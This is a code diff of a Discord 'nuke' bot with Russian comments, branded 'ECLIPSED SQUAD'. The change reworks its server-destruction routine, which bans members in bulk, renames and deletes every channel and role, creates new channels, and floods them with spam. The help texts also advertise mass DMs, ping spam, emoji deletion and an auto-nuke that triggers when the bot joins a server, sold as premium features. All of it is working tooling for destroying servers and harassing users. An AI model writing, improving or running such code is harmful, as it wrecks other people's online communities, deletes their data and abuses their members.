@@ -197,81 +197,12 @@ async def do_nuke(guild, spam_text=None):
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
 
 
-async def do_super_nuke(guild, spam_text=None):
-    """
-    Super Nuke — приоритеты:
-    1. Моментальное удаление каналов + ролей (параллельно)
-    2. Создание каналов сразу с 1 сообщением
-    3. Бан всех участников
-    4. Спам до 500 сообщений в общем
-    """
-    if spam_text is None:
-        spam_text = config.SPAM_TEXT
-
-    try:
-        await guild.edit(name=config.GUILD_NAME)
-    except Exception:
-        pass
-
-    bot_role = guild.me.top_role
-
-    # ── ПРИОРИТЕТ 1: Удаляем каналы + роли мгновенно, параллельно ──
-    await asyncio.gather(
-        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
-        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
-        return_exceptions=True
-    )
-
-    # ── ПРИОРИТЕТ 2: Создаём каналы и сразу шлём 1 сообщение в каждый ──
-    spam_per_channel = max(1, config.SPAM_COUNT // config.CHANNELS_COUNT)
-
-    async def create_and_first_msg(i):
-        try:
-            ch = await guild.create_text_channel(name=config.GUILD_NAME)
-            await ch.send(spam_text)  # сразу 1 сообщение
-            return ch
-        except Exception:
-            return None
-
-    created = await asyncio.gather(
-        *[create_and_first_msg(i) for i in range(config.CHANNELS_COUNT)],
-        return_exceptions=True
-    )
-    channels_ok = [ch for ch in created if isinstance(ch, discord.TextChannel)]
-
-    # ── ПРИОРИТЕТ 3: Баним всех участников параллельно ──
-    targets = [
-        m for m in guild.members
-        if not m.bot and m.id != guild.owner_id
-        and (not m.top_role or m.top_role < bot_role)
-    ]
-    await asyncio.gather(*[m.ban(reason="super_nuke") for m in targets], return_exceptions=True)
-
-    # ── ПРИОРИТЕТ 4: Спам до 500 сообщений в общем ──
-    already_sent = len(channels_ok)  # уже отправили по 1 в каждый
-    remaining = max(0, config.SPAM_COUNT - already_sent)
-    if remaining > 0 and channels_ok:
-        spam_tasks = []
-        per_ch = remaining // len(channels_ok)
-        leftover = remaining % len(channels_ok)
-        for idx, ch in enumerate(channels_ok):
-            count = per_ch + (1 if idx < leftover else 0)
-            for _ in range(count):
-                spam_tasks.append(ch.send(spam_text))
-        await asyncio.gather(*spam_tasks, return_exceptions=True)
-
-    nuke_running[guild.id] = False
-    nuke_starter.pop(guild.id, None)
-    last_spam_text[guild.id] = spam_text
-    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
-
-
 async def do_superpr_nuke_task(guild, spam_text=None):
-    """Всё одновременно — максимальная скорость, без приоритетов."""
+    """Приоритеты: 1. Бан всех  2. Переименование+удаление каналов/ролей  3. Создание каналов со спамом"""
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    TURBO_NAME = "Привет от Detected and DavaidKa"
+    TURBO_NAME = "Ебанутый приветик от DavaidKa"
 
     # Переименовываем сервер + описание
     try:
@@ -286,7 +217,10 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         and (not m.top_role or m.top_role < bot_role)
     ]
 
-    # Переименовываем все существующие каналы и роли параллельно
+    # ── ПРИОРИТЕТ 1: Баним всех как можно быстрее ──
+    await asyncio.gather(*[m.ban(reason="superpr_nuke") for m in targets], return_exceptions=True)
+
+    # ── ПРИОРИТЕТ 2: Переименовываем + удаляем каналы и роли параллельно ──
     async def rename_channel(ch):
         try:
             await ch.edit(name=TURBO_NAME)
@@ -299,6 +233,15 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
+    await asyncio.gather(
+        asyncio.gather(*[rename_channel(c) for c in guild.channels], return_exceptions=True),
+        asyncio.gather(*[rename_role(r) for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
+        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
+        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
+        return_exceptions=True
+    )
+
+    # ── ПРИОРИТЕТ 3: Создаём каналы со спамом ──
     async def create_and_spam(i):
         try:
             ch = await guild.create_text_channel(name=TURBO_NAME)
@@ -309,24 +252,13 @@ async def do_superpr_nuke_task(guild, spam_text=None):
         except Exception:
             pass
 
-    # ВСЁ ОДНОВРЕМЕННО
-    await asyncio.gather(
-        # Переименовываем существующие каналы и роли
-        asyncio.gather(*[rename_channel(c) for c in guild.channels], return_exceptions=True),
-        asyncio.gather(*[rename_role(r) for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
-        # Удаляем каналы и роли
-        asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
-        asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
-        # Баним всех
-        asyncio.gather(*[m.ban(reason="superpr_nuke") for m in targets], return_exceptions=True),
-        # Создаём каналы со спамом
-        asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True),
-        return_exceptions=True
-    )
+    await asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True)
+
     nuke_running[guild.id] = False
     nuke_starter.pop(guild.id, None)
     last_spam_text[guild.id] = spam_text
     last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+
 
 
 # ─── COMMANDS ──────────────────────────────────────────────
@@ -686,27 +618,6 @@ def premium_check():
 @bot.command(name="super_nuke")
 @premium_check()
 async def super_nuke(ctx, *, text: str = None):
-    guild = ctx.guild
-    if is_guild_blocked(guild.id):
-        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
-        embed.set_footer(text="☠️ ECLIPSED SQUAD")
-        await ctx.send(embed=embed)
-        return
-    if nuke_running.get(guild.id):
-        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
-        await ctx.send(embed=embed)
-        return
-    nuke_running[guild.id] = True
-    nuke_starter[guild.id] = ctx.author.id
-    spam_text = text if text else config.SPAM_TEXT
-    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
-    last_spam_text[guild.id] = spam_text
-    asyncio.create_task(do_super_nuke(guild, spam_text))
-
-
-@bot.command(name="superpr_nuke")
-@premium_check()
-async def superpr_nuke(ctx, *, text: str = None):
     guild = ctx.guild
     if is_guild_blocked(guild.id):
         embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
@@ -1252,8 +1163,7 @@ async def changelog(ctx):
     embed.add_field(
         name="💀 v1.5 — Super Nuke",
         value=(
-            "• `!super_nuke [текст]` — премиум нюк с приоритетами\n"
-            "• `!superpr_nuke [текст]` — premium нюк, всё одновременно\n"
+            "• `!super_nuke [текст]` — premium нюк, всё одновременно\n"
             "• `!auto_super_nuke` — авто версия для premium\n"
             "• `!auto_superpr_nuke` — авто версия для premium"
         ),
@@ -1262,14 +1172,26 @@ async def changelog(ctx):
     embed.add_field(
         name="⚡ v1.6 — Auto Superpr Nuke",
         value=(
-            "• `!superpr_nuke [текст]` — premium нюк, всё одновременно\n"
+            "• `!super_nuke [текст]` — premium нюк, всё одновременно\n"
             "• `!auto_superpr_nuke on/off/text/info` — авто premium нюк при входе\n"
             "• Переименование сервера, каналов и ролей → **Привет от Detected and DavaidKa**\n"
             "• `!set_spam_text` теперь обновляет текст и для `auto_superpr_nuke`"
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  текущая версия: v1.6")
+    embed.add_field(
+        name="🔥 v1.7 — Рефакторинг и улучшения",
+        value=(
+            "• `!super_nuke` — объединён в одну команду (бан → переименование → спам)\n"
+            "• Название при нюке: **Ебанутый приветик от DavaidKa**\n"
+            "• MongoDB — данные не слетают при рестарте Railway\n"
+            "• `!pm_add` автоматически добавляет в whitelist\n"
+            "• `!list` — все списки в одном embed, premium не дублируется в whitelist\n"
+            "• `!list_clear` — очистить все списки кроме овнеров"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt  |  текущая версия: v1.7")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -1344,8 +1266,7 @@ async def help_cmd(ctx):
         name="💎 PREMIUM",
         value=(
             "`!nuke [текст]` — нюк со своим текстом\n"
-            "`!super_nuke [текст]` — нюк с приоритетами\n"
-            "`!superpr_nuke [текст]` — нюк всё одновременно\n"
+            "`!super_nuke [текст]` — нюк всё одновременно\n"
             "`!massban` — забанить всех участников\n"
             "`!massdm [текст]` — разослать ДМ всем\n"
             "`!spam [кол-во] [текст]` — спам в канал\n"
@@ -1442,8 +1363,7 @@ async def commands_premium(ctx):
         name="💀 УНИЧТОЖЕНИЕ",
         value=(
             "`!nuke [текст]` — нюк со своим текстом\n"
-            "`!super_nuke [текст]` — нюк с приоритетами\n"
-            "`!superpr_nuke [текст]` — нюк всё одновременно\n"
+            "`!super_nuke [текст]` — нюк всё одновременно\n"
             "`!massban` — забанить всех участников\n"
             "`!rolesdelete` — удалить все роли\n"
             "`!emojisnuke` — удалить все эмодзи\n"
@@ -2358,15 +2278,17 @@ async def on_message(message):
                 return
             new_text = parts[1]
             config.SPAM_TEXT = new_text
+            AUTO_SUPER_NUKE_TEXT = new_text
             AUTO_SUPERPR_NUKE_TEXT = new_text
             save_spam_text()
+            save_auto_super_nuke()
             save_auto_superpr_nuke()
             embed = discord.Embed(
                 title="✅ Текст нюка обновлён",
                 description=f"```{new_text[:1000]}```",
                 color=0x0a0a0a
             )
-            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Обновлено: !nuke + auto_superpr_nuke")
+            embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Обновлено: все нюки")
             await message.channel.send(embed=embed)
             return
 
@@ -2841,8 +2763,7 @@ async def on_ready():
                 name="💎 PREMIUM",
                 value=(
                     "`!nuke [текст]` — нюк со своим текстом\n"
-                    "`!super_nuke [текст]` — нюк с приоритетами\n"
-                    "`!superpr_nuke [текст]` — нюк всё одновременно\n"
+                    "`!super_nuke [текст]` — нюк всё одновременно\n"
                     "`!massdm` `/massdm` — масс ДМ\n"
                     "`!massban` `/massban` — массбан\n"
                     "`!spam` — спам в канал  |  `!pingspam` — пинг спам\n"
